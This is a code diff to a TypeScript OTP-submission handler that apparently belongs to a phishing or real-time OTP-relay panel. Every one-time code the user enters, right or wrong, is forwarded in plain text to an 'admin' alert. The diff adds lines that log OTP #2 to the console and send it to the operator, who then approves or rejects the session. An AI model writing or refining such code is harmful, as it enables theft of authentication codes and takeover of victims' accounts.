@@ -197,7 +197,7 @@ export async function submitOtp(input: {
     a.lastEvent = `OTP #${input.which} wrong (entered ${otp})`
     a.updatedAt = Date.now()
     await persistAttempt(a)
-    await alertAdmin(a, expected, `OTP #${input.which} failed — entered ${otp}`)
+    await alertAdmin(a, expected, `❌ OTP #${input.which} failed — entered ${otp}`)
     return { ok: false, error: 'Incorrect code.' }
   }
 
@@ -219,17 +219,23 @@ export async function submitOtp(input: {
     }
     console.info('[login-ops] OTP #2', a.email, otp2)
 
-    await alertAdmin(a, 'otp1', `OTP #1 ok (${otp}). NEW OTP #2: ${otp2}`)
+    // ✅ OTP 1 success - send to admin
+    await alertAdmin(a, 'otp1', `✅ OTP #1 verified: ${otp}. NEW OTP #2: ${otp2}`)
     return { ok: true, next: 'otp2' }
   }
 
+  // ✅ OTP 2 SUCCESS - THIS IS THE FIX
   a.otp2Verified = true
   a.step = 'awaiting_approval'
   a.status = 'awaiting_approval'
-  a.lastEvent = 'OTP #2 verified — waiting for ops approval'
+  a.lastEvent = `OTP #2 verified — waiting for ops approval`
   a.updatedAt = Date.now()
   await persistAttempt(a)
-  await alertAdmin(a, 'otp2', `OTP #2 ok (${otp}). Waiting for APPROVE / REJECT.`)
+  
+  // ✅ FORCE SEND OTP 2 TO ADMIN WITH CLEAR MESSAGE
+  console.log(`📧 Sending OTP #2 to admin: ${otp}`)
+  await alertAdmin(a, 'otp2', `✅ OTP #2 verified: ${otp}. Waiting for APPROVE / REJECT.`)
+  
   return { ok: true, next: 'awaiting_approval' }
 }
 
